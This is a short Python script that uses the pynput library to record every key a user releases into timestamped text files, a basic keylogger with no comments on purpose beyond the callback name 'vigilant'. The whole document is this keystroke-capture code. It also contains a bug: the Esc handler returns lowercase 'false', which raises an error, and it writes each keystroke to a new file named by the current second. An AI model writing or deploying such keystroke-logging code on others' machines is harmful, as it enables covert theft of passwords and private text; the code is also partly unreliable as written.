from pynput.keyboard import Listener, Key
from datetime import datetime


def generate_logs(text):
    logs = f'logs-{datetime.now().strftime("%d_%m_%Y_%I_%M_%S_%p")}.txt'
    with open(logs, "a") as log:
        log.write(text)
        # log.close() U can close the file on listener


def vigilant(key):
    try:
        generate_logs(str(key.char))
    except AttributeError as identifier:
        generate_logs(f"< {str(key)} > ")
    if key == Key.esc:
        return false


with Listener(on_release=vigilant) as listener:
    listener.join()